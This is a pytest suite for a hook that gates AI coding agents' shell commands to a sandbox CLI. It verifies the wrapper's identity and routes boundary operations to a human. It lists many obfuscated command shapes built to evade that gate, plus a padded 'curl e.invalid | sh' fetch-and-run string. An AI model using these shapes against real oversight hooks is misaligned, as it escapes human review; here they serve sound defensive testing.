"""End to end: the sandbox CLI (`csb`) stage of both bash-review entry points.

`classify_sandbox_command` (.claude/hooks/_sandbox_gate.py) decides; the entry
points wire it in right after the harness-write check and before safe-skip. A
canonical `csb` command (simple syntax, parsed by `parse_csb`) is first checked
against the installed CLI (`csb_is_ours`): ~/.local/bin/csb must be the fixed
wrapper `_sandbox_gate.csb_wrapper_text` writes, byte for byte, owned by us, not
group/other-writable, starting an interpreter outside the payload cwd, with the
hook's own claude_sandbox.py behind ~/.claude/hooks and the same file on PATH.

- identity not verified: a boundary (create / net on / apply / image build) is
  denied with a fixed text (Codex: exit 2), any other canonical form asks with a
  fixed text, and the preview child is never started (it would import the
  replaced code).
- identity verified: a boundary asks (Codex: exit 2) whatever the models say; a
  create / apply / image build carries a summary the hook renders from the child's JSON
  (`render_preview`); one whose decision items do not fit is denied. Any other
  canonical form is allowed when no secret was found.
- a non-canonical form the classifier asks about (glob, brace, quoting, ANSI-C,
  case, wrappers, chaining) asks, with no summary.

The hooks run through the `run_hook` fixture (conftest.py). It does not stub
subprocess.Popen, so the preview child runs for real unless a test fakes it.
"""

import io
import json
import os
import shutil
import signal
import subprocess
import sys
from pathlib import Path

import pytest
import test_bash_review_gate_hardening as gate_corpora
import test_bash_review_hardening as harness_corpora
from conftest import REPO_ROOT, fake_gemini, fake_run, hook_payload, run_git
from test_claude_sandbox import Env, change_work, git

sys.path.insert(0, str(REPO_ROOT / ".claude" / "hooks"))
import _sandbox_gate as gate  # noqa: E402
import claude_sandbox as csb  # noqa: E402
from _bash_review_common import HARNESS_CWD_UNKNOWN  # noqa: E402

HOOK = ".claude/hooks/bash-review.py"
CODEX_HOOK = ".codex/hooks/bash-review.py"
# The launchers start the hooks on this interpreter, and csb_is_ours accepts only a
# wrapper that names it (the hook's own sys.executable). The tests run the hooks
# in-process, so sys.executable is set to it (_hook_interpreter) and the preview
# child really runs on it.
TRUSTED = gate.trusted_python()
pytestmark = pytest.mark.skipif(
    TRUSTED is None, reason="no trusted system python3 for the hooks to run on"
)
SANDBOX_CLI = REPO_ROOT / ".claude" / "hooks" / "claude_sandbox.py"
SUMMARY_LOG = {
    HOOK: ".claude/logs/bash-review.log",
    CODEX_HOOK: ".codex/logs/bash-review.log",
}
SID = "0123456789ab"
SHA = "ab" * 32
# Built at runtime so no literal in this file looks like a live credential.
FAKE_GITHUB_TOKEN = "gh" + "p_" + "A1b2C3d4E5f6G7h8I9j0" + "K1l2M3n4O5p6Q7r8"
# The child's git must not read the developer's own configuration.
GIT_ENV = {"GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1"}
FAILED = "（要約を作れなかった: {}）"
# Display spoofing characters, built at runtime (bandit B613 flags them as literals).
RLO, PDF = chr(0x202E), chr(0x202C)
# The real Popen, kept before any test patches subprocess.Popen.
_REAL_POPEN = subprocess.Popen
IDENTITY_DENY = "csb の実体を確かめられない"

CANONICAL_ALLOW = [
    f"csb exec {SID} -- npm test",
    f"csb exec {SID} -w /work/src -e CI=1 -- pytest -q",
    "csb ls",
    "csb ls --json",
    "csb status",
    f"csb status {SID} --json",
    f"csb export {SID}",
    f"csb verify {SID} --patch {SHA} -- pytest -q",
    f"csb attest {SID} --patch {SHA} --review codex=pass",
    f"csb preflight {SID} --patch {SHA}",
    f"csb rm {SID}",
    "csb gc --older-than 7d",
    f"csb net off {SID}",
]
BOUNDARIES = [
    ("csb create", "csb create は"),
    ("csb image build --generic", "csb image build は"),
    (f"csb net on {SID} --minutes 5", "csb net on は"),
    (f"csb apply {SID} --patch {SHA}", "csb apply は"),
]
BYPASSES = [
    # image build with its second word expanded at run time
    "csb image $(echo build) --generic",
    "csb image `echo build` --generic",
    "csb image b$(echo uild) --generic",
    "csb image $(echo build)",
    f"bash -c 'csb apply {SID} --patch {SHA}'",
    f"csb apply {SID} --patch {SHA} && ls",
    "env csb create",
    "csb $(echo apply) x",
    f"python3 ~/.claude/hooks/claude_sandbox.py apply {SID} --patch {SHA}",
    f"docker exec csb-{SID} sh",
    # high-risk as well: with both models allowing, the AND gate would let it run
    f"docker network connect csb-net-{SID} csb-{SID}",
    f"git apply ~/.local/state/claude-sandbox/{SID}/patches/{SHA}.patch",
    # globs, ANSI-C, escapes, case, wrappers, stdin arguments
    f"python3 ~/.claude/hooks/claude_sandbox.p? apply {SID} --patch {SHA}",
    f"csb ap?ly {SID} --patch {SHA}",
    f"csb [a]pply {SID} --patch {SHA}",
    f"csb net o? {SID}",
    "csb cre*",
    f"~/.local/bin/cs? apply {SID} --patch {SHA}",
    f"$'\\x63sb' apply {SID} --patch {SHA}",
    f"cs\\b apply {SID} --patch {SHA}",
    f"CSB apply {SID} --patch {SHA}",
    f"{{csb,apply}} {SID} --patch {SHA}",
    f"timeout 5 csb ap?ly {SID} --patch {SHA}",
    f"sh -c 'csb ap?ly {SID} --patch {SHA}'",
    "echo apply | xargs csb",
    # canonical boundaries mutated by an assignment, a metacharacter or a glob
    f"FOO=1 csb apply {SID} --patch {SHA}",
    f"csb apply {SID} --patch {SHA}; true",
    f"csb net on {SID} &",
    "csb create --image gener?c",
    # less common wrappers, and a glob CLI word after the command word
    f"caffeinate -i ~/.local/bin/cs? apply {SID} --patch {SHA}",
    f"arch -arm64 ~/.local/bin/c?b apply {SID} --patch {SHA}",
    f"script -q /dev/null ~/.local/bin/c[s]b apply {SID} --patch {SHA}",
    f"find . -exec ~/.local/bin/cs? apply {SID} --patch {SHA} ';'",
]
# Command words that hide their name are asked by the harness check (its
# obfuscated-command-word rule), which runs before this stage: still asked, no model,
# but logged as stage `pre`.
CAUGHT_BEFORE_THE_SANDBOX_STAGE = {
    f"$'\\x63sb' apply {SID} --patch {SHA}",
    f"cs\\b apply {SID} --patch {SHA}",
    # a command word with a glob in it (a wrapper's command word too) hides
    # the command name, so the harness-write check asks first
    f"~/.local/bin/cs? apply {SID} --patch {SHA}",
    f"caffeinate -i ~/.local/bin/cs? apply {SID} --patch {SHA}",
    f"arch -arm64 ~/.local/bin/c?b apply {SID} --patch {SHA}",
    f"script -q /dev/null ~/.local/bin/c[s]b apply {SID} --patch {SHA}",
}


@pytest.fixture(autouse=True)
def _private_state(tmp_path, monkeypatch):
    """The state root the hook hands to the preview child: never the real one."""
    state = tmp_path / "state"
    monkeypatch.setattr(gate, "state_dir", lambda home=None: str(state))
    return state


@pytest.fixture
def home(tmp_path):
    # The run_hook fixture's home (conftest.py); expanduser("~") lands here.
    path = tmp_path / "home"
    path.mkdir(exist_ok=True)
    return path


@pytest.fixture
def work(tmp_path):
    """A payload cwd that holds neither the interpreter nor the home."""
    path = tmp_path / "work"
    path.mkdir(exist_ok=True)
    return path


@pytest.fixture(autouse=True)
def _hook_interpreter(monkeypatch):
    """The hooks run on the trusted system python3 (see the launchers)."""
    monkeypatch.setattr(sys, "executable", TRUSTED)


def install_csb(home: Path, python: str | None = None) -> Path:
    """What install.sh does: the fixed wrapper, and the hooks link behind it."""
    python = TRUSTED if python is None else python
    bin_dir = home / ".local" / "bin"
    bin_dir.mkdir(parents=True, exist_ok=True)
    wrapper = bin_dir / "csb"
    if wrapper.is_symlink() or wrapper.exists():
        wrapper.unlink()
    wrapper.write_text(gate.csb_wrapper_text(python, str(home)), encoding="ascii")
    wrapper.chmod(0o755)
    hooks = home / ".claude" / "hooks"
    hooks.mkdir(parents=True, exist_ok=True)
    cli = hooks / "claude_sandbox.py"
    if not cli.is_symlink():
        cli.symlink_to(SANDBOX_CLI)
    return bin_dir


def _path_env(*dirs: Path) -> dict:
    return {"PATH": os.pathsep.join([*map(str, dirs), os.environ.get("PATH", "")])}


def _ours(home: Path) -> dict:
    return _path_env(install_csb(home))


def _run(run_hook, hook, command, *, env=None, cwd=None, urlopen=None, codex=None):
    payload = hook_payload(command)
    if cwd is not None:
        payload["cwd"] = str(cwd)
    return run_hook(hook, payload, urlopen=urlopen, run=codex, env=env)


def _outcome(res, hook) -> str:
    if hook == CODEX_HOOK:
        return "allow" if res.exit_code == 0 else "block"
    return res.decision


def _asked(res, hook) -> bool:
    if hook == CODEX_HOOK:
        return res.exit_code == 2
    return res.decision == "ask"


def _denied(res, hook) -> bool:
    if hook == CODEX_HOOK:
        return res.exit_code == 2
    return res.decision == "deny"


def _text(res, hook) -> str:
    return res.stderr if hook == CODEX_HOOK else res.reason


def _body(res, hook) -> str:
    """The reason without the Codex agent directive."""
    if hook == HOOK:
        return res.reason
    return res.stderr.split(" — BLOCKED by bash-review policy")[0]


def _last_entry(res, hook) -> tuple[str, str, str]:
    """(decision, stage, reason) of the last summary line."""
    log = res.home / SUMMARY_LOG[hook]
    line = log.read_text(encoding="utf-8").splitlines()[-1]
    _, _, rest = line.partition("] ")
    decision, stage, *_, reason = (part.strip() for part in rest.split(" | "))
    return decision, stage, reason


def _summary_text(res, hook) -> str:
    return (res.home / SUMMARY_LOG[hook]).read_text(encoding="utf-8")


class _Proc:
    def __init__(self, fake, args, kwargs):
        self.fake = fake
        self.args = args
        self.kwargs = kwargs
        # No real process group behind the fake: the hook must not signal one
        # (its guard sends anything that is not a pid above 1 to the child itself).
        self.pid = None
        self.returncode = None

    def communicate(self, input=None, timeout=None):  # noqa: A002
        self.fake.inputs.append(input)
        self.fake.timeouts.append(timeout)
        if self.fake.communicate_errors:
            raise self.fake.communicate_errors.pop(0)
        self.returncode = self.fake.returncode
        return self.fake.stdout, b""

    def terminate(self):
        self.fake.stops.append("term")

    def kill(self):
        self.fake.stops.append("kill")


class FakePreview:
    """Stands in for subprocess.Popen when the child's answer is what is tested."""

    def __init__(self, *, stdout=b"", returncode=0, error=None, communicate_errors=()):
        self.stdout = (
            stdout if isinstance(stdout, bytes) else json.dumps(stdout).encode()
        )
        self.returncode = returncode
        self.error = error
        self.communicate_errors = list(communicate_errors)
        self.stops: list = []
        self.calls: list = []
        self.inputs: list = []
        self.timeouts: list = []

    def __call__(self, args, **kwargs):
        self.calls.append((args, kwargs))
        if self.error is not None:
            raise self.error
        return _Proc(self, args, kwargs)


class SlowPreview:
    """A real child that never answers: the first communicate() times out.

    stubborn: the child ignores SIGTERM, so only the SIGKILL that follows ends it.
    """

    SLEEP = "import time; time.sleep(60)"
    STUBBORN = (
        "import signal, time; signal.signal(signal.SIGTERM, signal.SIG_IGN); "
        "print('ready', flush=True); time.sleep(60)"
    )

    def __init__(self, *, stubborn=False):
        self.stubborn = stubborn
        self.procs: list = []
        self.kwargs: list = []
        self.timeouts: list = []

    def __call__(self, args, **kwargs):
        self.kwargs.append(kwargs)
        real = _REAL_POPEN(  # noqa: S603
            [sys.executable, "-c", self.STUBBORN if self.stubborn else self.SLEEP],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            start_new_session=bool(kwargs.get("start_new_session")),
        )
        if self.stubborn:
            assert real.stdout is not None
            assert real.stdout.readline() == b"ready\n"  # SIGTERM is ignored now
        self.procs.append(real)
        outer = self

        class Proc:
            pid = real.pid

            def __init__(self):
                self.first = True

            @property
            def returncode(self):
                return real.returncode

            def communicate(self, input=None, timeout=None):  # noqa: A002
                if self.first:
                    self.first = False
                    outer.timeouts.append(timeout)
                    raise subprocess.TimeoutExpired(args, timeout)
                return real.communicate(timeout=timeout)

            def terminate(self):
                real.terminate()

            def kill(self):
                real.kill()

        return Proc()


def _create_data(**kw):
    plan = gate.create_plan("/srv/repo", {}, **kw)
    return gate.create_preview_data(plan, head="1" * 40)


# ---------------------------------------------------------------------------
# Identity verified: canonical work commands run without a model
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
class TestStaticAllow:
    @pytest.mark.parametrize("command", CANONICAL_ALLOW)
    def test_canonical_forms_run_without_a_model(self, run_hook, home, hook, command):
        # No model fake: reaching one would fail and end in ask / exit 2.
        res = _run(run_hook, hook, command, env=_ours(home))
        assert _outcome(res, hook) == "allow", _text(res, hook)
        decision, stage, reason = _last_entry(res, hook)
        assert (decision, stage) == ("ALLOW", "sandbox")
        assert "サンドボックスの中で完結する操作" in reason
        if hook == HOOK:
            assert "サンドボックスの中で完結する操作" in res.reason
        else:
            assert res.stdout == "" and res.stderr == ""

    def test_a_secret_in_an_allowed_form_is_not_allowed(self, run_hook, home, hook):
        command = f"csb exec {SID} -e GH_TOKEN={FAKE_GITHUB_TOKEN} -- gh repo list"
        res = _run(run_hook, hook, command, env=_ours(home))
        assert _asked(res, hook)
        assert "credential" in _text(res, hook)
        assert _last_entry(res, hook)[1] == "secret"
        assert FAKE_GITHUB_TOKEN not in _summary_text(res, hook)


# ---------------------------------------------------------------------------
# Identity not verified: boundaries are denied, other forms ask; no child
# ---------------------------------------------------------------------------
TAMPERS = [
    "missing",
    "bytes",
    "symlink",
    "group-writable",
    "python-under-cwd",
    "python-missing",
    "python-not-executable",
    "not-on-path",
    "another-csb-first-on-path",
    "cli-elsewhere",
    # the wrapper's interpreter must be the hook's own trusted one
    "python-on-path",
    "python-venv",
    "python-realpath",
    "python-other-candidate",
    "wrapper-names-plain-python",
    "bin-dir-symlink",
    "local-dir-symlink",
    # the same links pointing under HOME: trusted_path follows them, but the
    # wrapper then lives at a path without `.local/bin` in it, which the harness
    # check does not ask about, so the identity check refuses the link itself
    "bin-dir-symlink-in-home",
    "local-dir-symlink-in-home",
]


def _tamper(kind: str, home: Path, work: Path, tmp_path: Path) -> dict:
    """Install csb, break one property, and return the PATH env for the hook."""
    bin_dir = install_csb(home)
    wrapper = bin_dir / "csb"
    env = _path_env(bin_dir)
    if kind == "missing":
        wrapper.unlink()
    elif kind == "bytes":
        wrapper.write_text(wrapper.read_text() + "# appended\n")
    elif kind == "symlink":
        real = tmp_path / "elsewhere" / "csb"
        real.parent.mkdir()
        shutil.move(str(wrapper), real)
        wrapper.symlink_to(real)
    elif kind == "group-writable":
        wrapper.chmod(0o775)
    elif kind == "python-under-cwd":
        local = work / "bin" / "python3"
        local.parent.mkdir()
        local.symlink_to(sys.executable)
        install_csb(home, python=str(local))
    elif kind == "python-on-path":
        found = shutil.which("python3", path=os.environ.get("PATH"))
        if found in (None, TRUSTED):
            pytest.skip("no other python3 on PATH")
        install_csb(home, python=found)
    elif kind == "python-venv":
        # a venv's bin/python points at the same file, but reads its own
        # pyvenv.cfg and site-packages: realpath equality is not enough
        venv = tmp_path / "venv" / "bin" / "python3"
        venv.parent.mkdir(parents=True)
        venv.symlink_to(TRUSTED)
        (tmp_path / "venv" / "pyvenv.cfg").write_text("home = /evil\n")
        install_csb(home, python=str(venv))
    elif kind == "python-realpath":
        # what an install that recorded the resolved, version-specific path left
        # behind (an update of the interpreter removes that path)
        real = os.path.realpath(TRUSTED)
        if real == TRUSTED:
            pytest.skip("the trusted python3 is not a symlink here")
        install_csb(home, python=real)
    elif kind == "python-other-candidate":
        others = [
            c
            for c in gate.trusted_python_candidates()
            if c != TRUSTED and gate.trusted_path(c) == ""
        ]
        if not others:
            pytest.skip("only one trusted candidate here")
        install_csb(home, python=others[0])
    elif kind == "wrapper-names-plain-python":
        # a wrapper without the `unset` line and `-S`: not the fixed text
        cli = home / ".claude" / "hooks" / "claude_sandbox.py"
        wrapper.write_text(f"#!/bin/sh\nexec '{TRUSTED}' -I '{cli}' \"$@\"\n")
    elif kind == "bin-dir-symlink":
        moved = tmp_path / "elsewhere-bin"
        shutil.move(str(bin_dir), moved)
        bin_dir.symlink_to(moved)
    elif kind == "local-dir-symlink":
        local = home / ".local"
        moved = tmp_path / "elsewhere-local"
        shutil.move(str(local), moved)
        local.symlink_to(moved)
    elif kind == "bin-dir-symlink-in-home":
        moved = home / "repo" / "bin"
        moved.parent.mkdir()
        shutil.move(str(bin_dir), moved)
        bin_dir.symlink_to(moved)
        # the premise: trusted_path follows this link, so only the lstat refuses it
        assert not gate.trusted_path(
            str(wrapper), owners=(os.geteuid(),), top=str(home)
        )
    elif kind == "local-dir-symlink-in-home":
        local = home / ".local"
        moved = home / "dotfiles-local"
        shutil.move(str(local), moved)
        local.symlink_to(moved)
        assert not gate.trusted_path(
            str(wrapper), owners=(os.geteuid(),), top=str(home)
        )
    elif kind == "python-missing":
        install_csb(home, python=str(tmp_path / "no" / "python3"))
    elif kind == "python-not-executable":
        plain = tmp_path / "plain-python3"
        plain.write_text("not an interpreter\n")
        plain.chmod(0o644)
        install_csb(home, python=str(plain))
    elif kind == "not-on-path":
        empty = tmp_path / "empty-bin"
        empty.mkdir()
        env = {"PATH": str(empty)}
    elif kind == "another-csb-first-on-path":
        other = tmp_path / "other-bin"
        other.mkdir()
        shutil.copy2(wrapper, other / "csb")
        env = _path_env(other, bin_dir)
    elif kind == "cli-elsewhere":
        cli = home / ".claude" / "hooks" / "claude_sandbox.py"
        cli.unlink()
        cli.write_text("print('not the hook CLI')\n")
    return env


@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
class TestIdentity:
    @pytest.mark.parametrize("kind", TAMPERS)
    @pytest.mark.parametrize(("command", "phrase"), BOUNDARIES)
    def test_a_boundary_is_denied_without_starting_the_preview(
        self,
        run_hook,
        home,
        work,
        tmp_path,
        monkeypatch,
        hook,
        kind,
        command,
        phrase,
    ):
        fake = FakePreview(stdout=_create_data())
        monkeypatch.setattr(subprocess, "Popen", fake)
        env = _tamper(kind, home, work, tmp_path)
        res = _run(
            run_hook,
            hook,
            command,
            env=env,
            cwd=work,
            urlopen=fake_gemini("ALLOW"),
            codex=fake_run(stdout="ALLOW"),
        )
        assert _denied(res, hook)
        assert IDENTITY_DENY in _text(res, hook) and phrase not in _text(res, hook)
        assert fake.calls == []
        assert _last_entry(res, hook)[:2] == ("DENY", "sandbox")

    @pytest.mark.parametrize("kind", TAMPERS)
    def test_other_canonical_forms_ask_instead_of_the_usual_review(
        self, run_hook, home, work, tmp_path, hook, kind
    ):
        env = _tamper(kind, home, work, tmp_path)
        gemini_calls: list = []
        res = _run(
            run_hook,
            hook,
            f"csb exec {SID} -- npm test",
            env=env,
            cwd=work,
            urlopen=fake_gemini("ALLOW", calls=gemini_calls),
        )
        assert _asked(res, hook)
        assert IDENTITY_DENY in _text(res, hook)
        assert gemini_calls == []
        assert _last_entry(res, hook)[:2] == ("ASK", "sandbox")

    @pytest.mark.parametrize("wrapper_names", ["venv", "trusted"])
    def test_a_hook_running_on_another_interpreter_trusts_no_wrapper(
        self, run_hook, home, work, tmp_path, monkeypatch, hook, wrapper_names
    ):
        # The hook itself on a venv's python (or after an update moved the
        # interpreter): neither a wrapper naming that path nor one naming the
        # trusted python is the hook's own trusted interpreter.
        venv = tmp_path / "venv" / "bin" / "python3"
        venv.parent.mkdir(parents=True)
        venv.symlink_to(TRUSTED)
        monkeypatch.setattr(sys, "executable", str(venv))
        fake = FakePreview(stdout=_create_data())
        monkeypatch.setattr(subprocess, "Popen", fake)
        python = str(venv) if wrapper_names == "venv" else TRUSTED
        env = _path_env(install_csb(home, python=python))
        res = _run(run_hook, hook, "csb create --image generic", env=env, cwd=work)
        assert _denied(res, hook) and IDENTITY_DENY in _text(res, hook)
        res = _run(run_hook, hook, "csb ls", env=env, cwd=work)
        assert _asked(res, hook) and IDENTITY_DENY in _text(res, hook)
        assert fake.calls == []

    def test_the_trusted_wrapper_is_ours(self, run_hook, home, work, hook):
        # the positive twin of the tampers above: nothing else changed
        res = _run(run_hook, hook, "csb ls", env=_ours(home), cwd=work)
        assert _outcome(res, hook) == "allow"

    def test_a_wrapper_owned_by_someone_else_is_not_ours(
        self, run_hook, home, monkeypatch, hook
    ):
        env = _ours(home)
        real = os.geteuid()
        monkeypatch.setattr(os, "geteuid", lambda: real + 1)
        res = _run(run_hook, hook, "csb ls", env=env)
        assert _asked(res, hook) and IDENTITY_DENY in _text(res, hook)

    def test_an_identity_check_exception_is_not_an_allow(
        self, run_hook, home, monkeypatch, hook
    ):
        env = _ours(home)

        def boom(name, *args, **kwargs):
            raise RuntimeError("which failed")

        monkeypatch.setattr(shutil, "which", boom)
        res = _run(run_hook, hook, f"csb exec {SID} -- npm test", env=env)
        assert _asked(res, hook) and IDENTITY_DENY in _text(res, hook)
        assert "which failed" not in _text(res, hook)

    def test_a_bypass_asks_whether_or_not_csb_is_installed(self, run_hook, hook):
        res = _run(run_hook, hook, f"csb ap?ly {SID} --patch {SHA}")
        assert _asked(res, hook) and IDENTITY_DENY not in _text(res, hook)


# ---------------------------------------------------------------------------
# Identity verified: boundaries and bypasses always reach a human
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
class TestAlwaysAsk:
    @pytest.mark.parametrize(("command", "phrase"), BOUNDARIES)
    def test_boundaries_ask_even_when_both_models_would_allow(
        self, run_hook, home, hook, command, phrase, monkeypatch
    ):
        if command.startswith("csb image build"):
            # the summary of a Dockerfile that fits (the real one does not: below)
            monkeypatch.setattr(subprocess, "Popen", FakePreview(stdout=_image_data()))
        gemini_calls: list = []
        codex_calls: list = []
        res = _run(
            run_hook,
            hook,
            command,
            env=_ours(home),
            urlopen=fake_gemini("ALLOW", calls=gemini_calls),
            codex=fake_run(stdout="ALLOW", calls=codex_calls),
        )
        assert _asked(res, hook)
        assert phrase in _text(res, hook)
        assert gemini_calls == [] and codex_calls == []
        decision, stage, reason = _last_entry(res, hook)
        assert (decision, stage) == ("ASK", "sandbox")
        assert phrase in reason

    @pytest.mark.parametrize("command", BYPASSES)
    def test_bypass_shapes_ask_even_when_both_models_would_allow(
        self, run_hook, home, hook, command
    ):
        gemini_calls: list = []
        res = _run(
            run_hook,
            hook,
            command,
            env=_ours(home),
            urlopen=fake_gemini("ALLOW", calls=gemini_calls),
            codex=fake_run(stdout="ALLOW"),
        )
        assert _asked(res, hook)
        assert gemini_calls == []
        stage = "pre" if command in CAUGHT_BEFORE_THE_SANDBOX_STAGE else "sandbox"
        assert _last_entry(res, hook)[:2] == ("ASK", stage)
        # the reason names the shape in fixed words; it never quotes the command
        assert SHA not in _text(res, hook)

    def test_a_secret_does_not_change_the_ask(
        self, run_hook, home, work, hook, monkeypatch
    ):
        # The --setup value would be shown in the plan: with a secret in the command
        # the summary is not built at all.
        fake = FakePreview(stdout=_create_data())
        monkeypatch.setattr(subprocess, "Popen", fake)
        command = f"csb create --setup 'GH_TOKEN={FAKE_GITHUB_TOKEN} npm ci'"
        res = _run(run_hook, hook, command, env=_ours(home), cwd=work)
        assert _asked(res, hook)
        text = _text(res, hook)
        assert "csb create は" in text
        assert FAKE_GITHUB_TOKEN not in text
        assert FAILED.format("秘密を検出") in text
        assert fake.calls == []
        assert _last_entry(res, hook)[:2] == ("ASK", "sandbox")
        assert FAKE_GITHUB_TOKEN not in _summary_text(res, hook)

    def test_notifies_like_the_other_asks(self, run_hook, home, hook, monkeypatch):
        notes: list = []
        # The hook imports notify by name; patch it where it is looked up.
        import _bash_review_common as common

        monkeypatch.setattr(
            common, "notify", lambda title, message, timeout=5: notes.append(title)
        )
        res = _run(run_hook, hook, f"csb net on {SID}", env=_ours(home))
        assert _asked(res, hook)
        assert notes == ["Bash Review - 確認が必要"]
        # no wrapper to verify (and no _ours, which would install it again): denied
        (home / ".local" / "bin" / "csb").unlink()
        res = _run(run_hook, hook, f"csb net on {SID}")
        assert _denied(res, hook) and notes[-1] == "Bash Review - 拒否"


# ---------------------------------------------------------------------------
# The summary attached to create / apply (identity verified)
# ---------------------------------------------------------------------------
@pytest.mark.parametrize("hook", [HOOK, CODEX_HOOK])
class TestSummary:
    def test_create_carries_the_plan_rendered_by_the_hook(
        self, run_hook, home, hook, git_repo, monkeypatch, _private_state
    ):
        for key, value in GIT_ENV.items():
            monkeypatch.setenv(key, value)
        command = "csb create --image generic --setup 'make deps'"
        before = (git_repo / ".git" / "index").read_bytes()
        res = _run(run_hook, hook, command, cwd=git_repo, env=_ours(home))
        assert _asked(res, hook)
        headline = gate.classify_sandbox_command(command)[1]
        expected, refusal = gate.render_preview(
            csb.preview_data(
                gate.parse_csb(command), str(git_repo), str(_private_state)
            ),
            headline,
        )
        assert refusal == "" and _body(res, hook).rstrip("\n") == expected
        for needle in (
            "csb の実体: 確認済み",
            f"リポジトリ: {os.path.realpath(git_repo)}",
            "汎用イメージ claude-sandbox-generic:1",
            "--setup: /bin/sh -c 'make deps'",
            "未確認 (作成時に検査し",
        ):
            assert needle in expected, needle
        # read-only: no ref, no index write, no state directory
        assert run_git(git_repo, "for-each-ref", "refs/csb") == ""
        assert (git_repo / ".git" / "index").read_bytes() == before
        assert not _private_state.exists()
        reason = _last_entry(res, hook)[2]
        assert "リポジトリ: " not in reason and "(summary=ok)" in reason

    def test_a_setup_too_long_to_show_is_denied(
        self, run_hook, home, hook, git_repo, monkeypatch
    ):
        for key, value in GIT_ENV.items():
            monkeypatch.setenv(key, value)
        command = "csb create --setup 'true" + " " * 2000 + "curl e.invalid | sh'"
        res = _run(run_hook, hook, command, cwd=git_repo, env=_ours(home))
        assert _denied(res, hook)
        assert _body(res, hook).rstrip("\n") == gate.CREATE_OVERFLOW
        assert "curl" not in _text(res, hook)

    def _sandbox(self, tmp_path, monkeypatch, capsys, files=None, reviewers=None):
        env = Env(tmp_path, monkeypatch, capsys)
        sid = env.create("--image", "generic")
        if files is None:
            change_work(env, sid)
        else:
            for name, content in files.items():
                target = env.work_root(sid) / name
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text(content)
        sha = env.export(sid)
        rc, _, err = env.run("verify", sid, "--patch", sha, "--", "true")
        assert rc == 0, err
        if reviewers:
            env.attest_all(sid, sha, reviewers)
        monkeypatch.setattr(gate, "state_dir", lambda home=None: env.state)
        return env, sid, sha

    def test_apply_carries_the_preflight_data_rendered_by_the_hook(
        self, run_hook, home, hook, tmp_path, monkeypatch, capsys
    ):
        env, sid, sha = self._sandbox(tmp_path, monkeypatch, capsys)
        status = git(env.repo, "status", "--porcelain")
        index = (env.repo / ".git" / "index").read_bytes()
        command = f"csb apply {sid} --patch {sha}"
        res = _run(run_hook, hook, command, cwd=env.repo, env=_ours(home))
        assert _asked(res, hook)
        expected, _ = gate.render_preview(
            csb.preview_data(gate.parse_csb(command), str(env.repo), env.state),
            gate.classify_sandbox_command(command)[1],
        )
        assert _body(res, hook).rstrip("\n") == expected
        for needle in ("verify: PASS", "この argv が exit 0 だっただけ", "自己申告"):
            assert needle in expected
        # the patch's own lines never reach the dialog, and nothing was written
        assert "+world" not in expected and "brand new" not in expected
        assert git(env.repo, "status", "--porcelain") == status
        assert (env.repo / ".git" / "index").read_bytes() == index

    def test_padding_cannot_push_the_decision_out(
        self, run_hook, home, hook, tmp_path, monkeypatch, capsys
    ):
        # End to end: 40 long benign names ahead of a
        # harness file and a CI file, verify PASS and every attest passing.
        files = {f".aaaa/{i:02d}-{'x' * 110}.md": "a\n" for i in range(40)}
        files[".claude/settings.json"] = "{}\n"
        files[".github/workflows/x.yml"] = "on: push\n"
        env, sid, sha = self._sandbox(
            tmp_path,
            monkeypatch,
            capsys,
            files,
            [*gate.REQUIRED_REVIEWERS, "security-reviewer"],
        )
        command = f"csb apply {sid} --patch {sha}"
        res = _run(run_hook, hook, command, cwd=env.repo, env=_ours(home))
        assert _asked(res, hook)
        body = _body(res, hook).rstrip("\n")
        assert len(body) <= gate.PREVIEW_TOTAL_CHARS
        for needle in (
            "拒否理由 (1 件",
            "ハーネス設定 (全 1 件): .claude/settings.json",
            ".github/workflows/x.yml",
            "security-reviewer",
            "verify: PASS",
            "自己申告",
            f"git -C {env.repo} apply --check",
            f"# 出力が {sha} で始まることを確かめる",
        ):
            assert needle in body, needle
        assert body.index("shasum -a 256") < body.index("apply --check")
        assert body.splitlines()[-1].startswith("…")
        assert f"csb preflight {sid} --patch {sha}" in body.splitlines()[-1]

    def test_a_filtered_repository_is_a_blocker_in_the_dialog(
        self, run_hook, home, hook, git_repo, monkeypatch
    ):
        for key, value in GIT_ENV.items():
            monkeypatch.setenv(key, value)
        (git_repo / ".gitattributes").write_text("secret.env filter=git-crypt\n")
        (git_repo / "secret.env").write_text("x\n")
        run_git(git_repo, "add", "-A")
        run_git(git_repo, "commit", "-q", "-m", "crypt")
        # The data comes from the preview_main the child runs, called here with the
        # docker lookup fixed: whether this machine has a docker csb could pin
        # (a CI runner usually has none) would otherwise add a blocker of its own.
        monkeypatch.setattr(csb, "_find_docker_binary", lambda: "/usr/local/bin/docker")
        monkeypatch.setattr(csb, "_owner_name", lambda path: "root")
        monkeypatch.setattr(csb, "_docker_signature_text", lambda path: "-")
        request = {"argv": ["create"], "cwd": str(git_repo), "state": gate.state_dir()}
        out = io.StringIO()
        assert csb.preview_main(io.StringIO(json.dumps(request)), out) == 0
        monkeypatch.setattr(
            subprocess, "Popen", FakePreview(stdout=out.getvalue().encode("utf-8"))
        )
        res = _run(run_hook, hook, "csb create", cwd=git_repo, env=_ours(home))
        assert _asked(res, hook)
        text = _text(res, hook)
        assert "拒否理由 (1 件" in text
        assert "filter 属性のあるリポジトリは非対応" in text and "secret.env" in text
        assert "docker: /usr/local/bin/docker" in text

    @pytest.mark.parametrize(
        ("command", "where", "word"),
        [
            ("csb create", "plain-dir", "拒否"),
            # no usable payload cwd: the hook's own cwd (here the plain dir) is used
            ("csb create", None, "拒否"),
            ("csb create", "relative", "拒否"),
            (f"csb apply {SID} --patch {SHA}", "plain-dir", "拒否"),
        ],
    )
    def test_a_summary_that_cannot_be_built_is_a_fixed_phrase(
        self, run_hook, home, hook, tmp_path, monkeypatch, command, where, word
    ):
        for key, value in GIT_ENV.items():
            monkeypatch.setenv(key, value)
        plain = tmp_path / "plain"
        plain.mkdir()
        monkeypatch.chdir(plain)
        cwd = {"plain-dir": plain, None: None, "relative": "plain"}[where]
        res = _run(run_hook, hook, command, cwd=cwd, env=_ours(home))
        assert _asked(res, hook)
        text = _text(res, hook)
